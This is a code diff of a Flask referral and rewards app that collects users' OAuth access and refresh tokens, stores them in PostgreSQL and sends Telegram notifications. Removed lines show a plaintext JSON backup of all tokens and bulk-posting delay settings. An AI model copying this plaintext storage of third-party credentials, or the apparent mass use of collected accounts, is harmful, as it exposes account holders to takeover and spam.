@@ -3,126 +3,144 @@ import hashlib
 import os
 import psycopg2
 import requests
-import time
 import json
 import random
 import string
 from flask import Flask, redirect, request, session, render_template, url_for, flash
 from psycopg2.extras import RealDictCursor
-from functools import wraps
 
-# Configuration: Ensure these environment variables are set correctly
+# Configuration
 CLIENT_ID = os.getenv('CLIENT_ID')
 CLIENT_SECRET = os.getenv('CLIENT_SECRET')
 CALLBACK_URL = os.getenv('CALLBACK_URL')
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
-WEBHOOK_URL = os.getenv('WEBHOOK_URL')
-DATABASE_URL = os.getenv('DATABASE_URL')  # Render PostgreSQL URL
-ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
-ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')
-
-# Set default delay values from environment variables
-DEFAULT_MIN_DELAY = int(os.getenv("BULK_POST_MIN_DELAY", 2))
-DEFAULT_MAX_DELAY = int(os.getenv("BULK_POST_MAX_DELAY", 10))
+DATABASE_URL = os.getenv('DATABASE_URL')
+APP_URL = os.getenv('APP_URL')  # Base URL for referral links
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
-BACKUP_FILE = 'tokens_backup.txt'
 
-# Initialize PostgreSQL database
-def init_db():
-    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-    cursor = conn.cursor()
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS tokens (
-            id SERIAL PRIMARY KEY,
-            access_token TEXT NOT NULL,
-            refresh_token TEXT,
-            username TEXT NOT NULL
-        )
-    ''')
-    conn.commit()
-    conn.close()
-
-init_db()  # Ensure the database is initialized when the app starts
-
+# Initialize PostgreSQL database schema
 def init_db_schema():
-    """
-    Initializes and verifies that required tables and columns are present in the database.
-    """
-    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-    cursor = conn.cursor()
-    try:
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS users (
-                id SERIAL PRIMARY KEY,
-                username TEXT UNIQUE NOT NULL,
-                token_balance FLOAT DEFAULT 0,
-                referral_count INT DEFAULT 0,
-                referral_reward FLOAT DEFAULT 0,
-                referral_url TEXT
-            )
-        ''')
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS tasks (
-                id SERIAL PRIMARY KEY,
-                user_id INT REFERENCES users(id),
-                title TEXT NOT NULL,
-                description TEXT,
-                task_reward FLOAT DEFAULT 0,
-                completed BOOLEAN DEFAULT FALSE,
-                status TEXT
-            )
-        ''')
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS settings (
-                setting_name TEXT PRIMARY KEY,
-                setting_value FLOAT
-            )
-        ''')
-        cursor.execute('''
-            INSERT INTO settings (setting_name, setting_value) VALUES
-            ('referral_reward', %s), ('task_reward', %s)
-            ON CONFLICT (setting_name) DO NOTHING
-        ''', (10.0, 5.0))  # Default values can be adjusted as needed
+    with psycopg2.connect(DATABASE_URL, sslmode='require') as conn:
+        with conn.cursor() as cursor:
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS tokens (
+                    id SERIAL PRIMARY KEY,
+                    access_token TEXT NOT NULL,
+                    refresh_token TEXT,
+                    username TEXT NOT NULL UNIQUE
+                );
+            ''')
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS users (
+                    id SERIAL PRIMARY KEY,
+                    username TEXT UNIQUE NOT NULL,
+                    token_balance FLOAT DEFAULT 0,
+                    referral_count INT DEFAULT 0,
+                    referral_reward FLOAT DEFAULT 0,
+                    referral_url TEXT
+                );
+            ''')
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS tasks (
+                    id SERIAL PRIMARY KEY,
+                    user_id INT REFERENCES users(id),
+                    title TEXT NOT NULL,
+                    description TEXT,
+                    task_reward FLOAT DEFAULT 0,
+                    completed BOOLEAN DEFAULT FALSE,
+                    status TEXT
+                );
+            ''')
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS settings (
+                    setting_name TEXT PRIMARY KEY,
+                    setting_value FLOAT
+                );
+            ''')
+            conn.commit()
+    print("Database schema initialized and verified.")
 
-        conn.commit()
-        print("Database schema initialized and verified.")
-    except Exception as e:
-        print(f"Error initializing database schema: {e}")
-    finally:
-        conn.close()
-
-# Run this initialization function at the start
+# Ensure the database schema is initialized on startup
 init_db_schema()
 
+# Store tokens in the database and create backup
 def store_token(access_token, refresh_token, username):
-    print("Storing token in the database...")
+    print(f"Storing token for @{username}...")
     try:
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-        cursor.execute("SELECT id FROM tokens WHERE username = %s", (username,))
-        existing_user = cursor.fetchone()
-        if existing_user:
-            cursor.execute("DELETE FROM tokens WHERE username = %s", (username,))
-            print(f"Old token data for @{username} has been deleted to prevent duplicate entries.")
-
-        cursor.execute('''
-            INSERT INTO tokens (access_token, refresh_token, username)
-            VALUES (%s, %s, %s)
-        ''', (access_token, refresh_token, username))
-        conn.commit()
-        conn.close()
-        
-        backup_data = get_all_tokens()
-        formatted_backup_data = [{'access_token': a, 'refresh_token': r, 'username': u} for a, r, u in backup_data]
-        with open(BACKUP_FILE, 'w') as f:
-            json.dump(formatted_backup_data, f, indent=4)
-        print(f"Backup created/updated in {BACKUP_FILE}. Total tokens: {len(backup_data)}")
-        send_message_via_telegram(f"💾 Backup updated! Token added for @{username}.\n📊 Total tokens in backup: {len(backup_data)}")
+        with psycopg2.connect(DATABASE_URL, sslmode='require') as conn:
+            with conn.cursor() as cursor:
+                cursor.execute("DELETE FROM tokens WHERE username = %s", (username,))
+                cursor.execute('''
+                    INSERT INTO tokens (access_token, refresh_token, username)
+                    VALUES (%s, %s, %s)
+                ''', (access_token, refresh_token, username))
+                conn.commit()
+                print(f"Token stored for @{username}.")
+                send_message_via_telegram(f"Token stored for @{username}.")
     except Exception as e:
-        print(f"Database error while storing token: {e}")
+        print(f"Error storing token for @{username}: {e}")
+
+# Generate referral URL
+def generate_referral_url(username):
+    try:
+        base_url = APP_URL
+        if not base_url:
+            raise ValueError("APP_URL environment variable is not set.")
+        
+        with psycopg2.connect(DATABASE_URL, sslmode='require') as conn:
+            with conn.cursor() as cursor:
+                cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
+                result = cursor.fetchone()
+                
+                if result:
+                    user_id, existing_referral_url = result
+                    if not existing_referral_url:
+                        referral_url = f"{base_url}?referrer_id={user_id}"
+                        cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
+                        conn.commit()
+                        return referral_url
+                    return existing_referral_url
+                else:
+                    print(f"User {username} not found in users table.")
+                    return None
+    except Exception as e:
+        print(f"Error generating referral URL for {username}: {e}")
+        return None
+
+# Process referral
+def add_referral(referrer_id, referred_user):
+    try:
+        with psycopg2.connect(DATABASE_URL, sslmode='require') as conn:
+            with conn.cursor() as cursor:
+                cursor.execute("SELECT referral_count, referral_reward, token_balance FROM users WHERE id = %s", (referrer_id,))
+                referrer = cursor.fetchone()
+                
+                if referrer:
+                    referral_count, current_reward, token_balance = referrer
+                    referral_reward_amount = get_referral_reward_amount()
+                    
+                    new_count = referral_count + 1
+                    new_reward = current_reward + referral_reward_amount
+                    new_token_balance = token_balance + referral_reward_amount
+                    
+                    cursor.execute("""
+                        UPDATE users
+                        SET referral_count = %s, referral_reward = %s, token_balance = %s
+                        WHERE id = %s
+                    """, (new_count, new_reward, new_token_balance, referrer_id))
+                    
+                    conn.commit()
+                    print(f"Referral updated for referrer ID {referrer_id}.")
+                    send_message_via_telegram(f"New referral added for @{referred_user}. Referrer ID: {referrer_id}")
+                else:
+                    print(f"Referrer with ID {referrer_id} not found.")
+    except Exception as e:
+        print(f"Error updating referral: {e}")
+
+# Helper functions and routes (remaining the same as in your code)
 
 def restore_from_backup():
     print("Restoring from backup if database is empty...")
@@ -495,35 +513,6 @@ def home():
     return render_template('home.html')
 
 
-def generate_referral_url(username):
-    referral_url = f"https://taskair.io/referral/{username}"  # Adjusted default URL generation
-    try:
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-
-        # Check if the user already has a referral URL
-        cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
-        result = cursor.fetchone()
-
-        if result:
-            user_id, existing_referral_url = result
-            if existing_referral_url:
-                referral_url = existing_referral_url
-            else:
-                # Update the referral URL in the database if it does not exist
-                cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
-                conn.commit()
-                print(f"Referral URL created for user ID {user_id}: {referral_url}")
-        else:
-            print(f"User {username} not found in the database when generating referral URL.")
-
-        conn.close()
-    except Exception as e:
-        print(f"Error generating or retrieving referral URL for {username}: {e}")
-
-    return referral_url
-
-
 @app.route('/welcome')
 def welcome():
     username = session.get('username', 'User')
@@ -664,48 +653,6 @@ def delete_user(user_id):
     except Exception as e:
         print(f"Error deleting user ID {user_id}: {e}")
 
-
-def add_referral(referrer_id, referred_user):
-    try:
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-        
-        # Retrieve referrer details
-        cursor.execute("SELECT referral_count, referral_reward, token_balance FROM users WHERE id = %s", (referrer_id,))
-        referrer = cursor.fetchone()
-        
-        if referrer:
-            referral_count, current_reward, token_balance = referrer
-            referral_reward_amount = get_referral_reward_amount()
-            
-            # Update referral count, reward, and token balance for the referrer
-            new_count = referral_count + 1
-            new_reward = current_reward + referral_reward_amount
-            new_token_balance = token_balance + referral_reward_amount
-            
-            cursor.execute("""
-                UPDATE users
-                SET referral_count = %s, referral_reward = %s, token_balance = %s
-                WHERE id = %s
-            """, (new_count, new_reward, new_token_balance, referrer_id))
-            
-            conn.commit()
-            print(f"Referral updated for referrer ID {referrer_id}: Total referrals = {new_count}, reward = {new_reward}")
-            
-            # Send Telegram notification
-            send_message_via_telegram(
-                f"🎉 New referral by user ID {referrer_id}! 🎉\n"
-                f"Referred User: @{referred_user}\n"
-                f"Total Referrals: {new_count}\n"
-                f"Total Referral Reward: {new_reward} tokens\n"
-                f"Updated Token Balance: {new_token_balance} tokens"
-            )
-        else:
-            print(f"Referrer with ID {referrer_id} not found.")
-        
-        conn.close()
-    except Exception as e:
-        print(f"Error updating referral count and reward: {e}")
 
 
 def complete_task(user_id, task_id):
